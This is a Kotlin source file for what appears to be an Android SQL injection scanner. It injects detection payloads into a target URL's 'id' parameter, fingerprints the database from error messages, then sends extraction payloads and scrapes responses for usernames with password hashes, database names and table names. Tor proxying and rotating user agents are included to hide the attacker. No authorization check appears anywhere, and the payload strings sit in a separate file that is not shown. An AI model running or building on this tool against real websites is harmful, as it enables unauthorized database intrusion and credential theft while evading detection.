package com.sqliblackboxpro

import okhttp3.*
import java.net.InetSocketAddress
import java.net.Proxy
import java.util.concurrent.TimeUnit

class SQLScanner {
    
    private val standardClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    
    private val torClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .proxy(Proxy(Proxy.Type.SOCKS, InetSocketAddress("127.0.0.1", 9050)))
        .build()
    
    private val stealthUserAgents = listOf(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    )
    
    suspend fun scanURL(url: String, mode: ScanMode): ScanResult {
        val client = when (mode) {
            ScanMode.STANDARD -> standardClient
            ScanMode.TOR -> torClient
            ScanMode.STEALTH -> createStealthClient()
        }
        
        var vulnerabilityFound = false
        var detectedDatabase = DatabaseType.UNKNOWN
        var successfulPayload = ""
        var responseDetails = ""
        val extractedData = mutableListOf<String>()
        
        // Test detection payloads first
        for (payload in SQLPayloads.DETECTION_PAYLOADS) {
            try {
                val testUrl = buildTestUrl(url, payload)
                val request = Request.Builder()
                    .url(testUrl)
                    .apply {
                        if (mode == ScanMode.STEALTH) {
                            header("User-Agent", stealthUserAgents.random())
                        }
                    }
                    .build()
                
                val response = client.newCall(request).execute()
                val body = response.body?.string() ?: ""
                response.close()
                
                // Check for SQL errors in response
                if (containsSQLError(body)) {
                    vulnerabilityFound = true
                    detectedDatabase = detectDatabaseType(body)
                    successfulPayload = payload
                    responseDetails = body.take(500)
                    break
                }
            } catch (e: Exception) {
                // Continue testing other payloads
            }
        }
        
        // If vulnerability found, try to extract data
        if (vulnerabilityFound) {
            val extractionPayloads = when (detectedDatabase) {
                DatabaseType.MYSQL -> SQLPayloads.DATA_EXTRACTION_PAYLOADS
                else -> SQLPayloads.DATA_EXTRACTION_PAYLOADS // Default to MySQL payloads
            }
            
            for (payload in extractionPayloads.take(3)) { // Try first 3 extraction payloads
                try {
                    val testUrl = buildTestUrl(url, payload)
                    val request = Request.Builder()
                        .url(testUrl)
                        .apply {
                            if (mode == ScanMode.STEALTH) {
                                header("User-Agent", stealthUserAgents.random())
                            }
                        }
                        .build()
                    
                    val response = client.newCall(request).execute()
                    val body = response.body?.string() ?: ""
                    response.close()
                    
                    // Try to extract data from response
                    val extracted = extractDataFromResponse(body)
                    if (extracted.isNotEmpty()) {
                        extractedData.addAll(extracted)
                    }
                } catch (e: Exception) {
                    // Continue with next payload
                }
            }
        }
        
        return ScanResult(
            isVulnerable = vulnerabilityFound,
            databaseType = detectedDatabase,
            extractedData = extractedData,
            payloadUsed = successfulPayload,
            responseDetails = responseDetails
        )
    }
    
    private fun createStealthClient(): OkHttpClient {
        return OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build()
    }
    
    private fun buildTestUrl(baseUrl: String, payload: String): String {
        val separator = if (baseUrl.contains("?")) "&" else "?"
        // Try multiple parameter injection points
        return "${baseUrl}${separator}id=${java.net.URLEncoder.encode(payload, "UTF-8")}"
    }
    
    private fun containsSQLError(response: String): Boolean {
        val errorPatterns = listOf(
            "SQL syntax",
            "mysql_fetch",
            "mysqli",
            "PostgreSQL",
            "pg_query",
            "ORA-",
            "Microsoft SQL",
            "ODBC SQL",
            "SQLite",
            "sqlite3",
            "Unclosed quotation",
            "syntax error",
            "Warning: mysql",
            "valid MySQL result",
            "MySqlClient",
            "SQL Server",
            "Driver.*SQL",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Npgsql\\.",
            "PG::SyntaxError",
            "org.postgresql.util.PSQLException",
            "com.mysql.jdbc.exceptions",
            "java.sql.SQLException"
        )
        
        return errorPatterns.any { pattern ->
            response.contains(pattern, ignoreCase = true)
        }
    }
    
    private fun detectDatabaseType(response: String): DatabaseType {
        return when {
            response.contains("mysql", ignoreCase = true) ||
            response.contains("mysqli", ignoreCase = true) -> DatabaseType.MYSQL
            
            response.contains("postgresql", ignoreCase = true) ||
            response.contains("pg_query", ignoreCase = true) ||
            response.contains("npgsql", ignoreCase = true) -> DatabaseType.POSTGRESQL
            
            response.contains("microsoft sql", ignoreCase = true) ||
            response.contains("sql server", ignoreCase = true) -> DatabaseType.MSSQL
            
            response.contains("ora-", ignoreCase = true) ||
            response.contains("oracle", ignoreCase = true) -> DatabaseType.ORACLE
            
            response.contains("sqlite", ignoreCase = true) -> DatabaseType.SQLITE
            
            else -> DatabaseType.UNKNOWN
        }
    }
    
    private fun extractDataFromResponse(response: String): List<String> {
        val extracted = mutableListOf<String>()
        
        // Look for common data patterns
        // Extract potential usernames
        val usernamePattern = Regex("([a-zA-Z0-9_-]+):(\\$[^\\s]+|[a-f0-9]{32,})")
        usernamePattern.findAll(response).forEach { match ->
            extracted.add("User: ${match.groupValues[1]}, Hash: ${match.groupValues[2]}")
        }
        
        // Extract database names
        val dbNamePattern = Regex("database[^:]*:\\s*([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
        dbNamePattern.findAll(response).forEach { match ->
            extracted.add("Database: ${match.groupValues[1]}")
        }
        
        // Extract table names  
        val tablePattern = Regex("table[^:]*:\\s*([a-zA-Z0-9_-]+)", RegexOption.IGNORE_CASE)
        tablePattern.findAll(response).forEach { match ->
            extracted.add("Table: ${match.groupValues[1]}")
        }
        
        return extracted.take(10) // Limit to first 10 extractions
    }
}
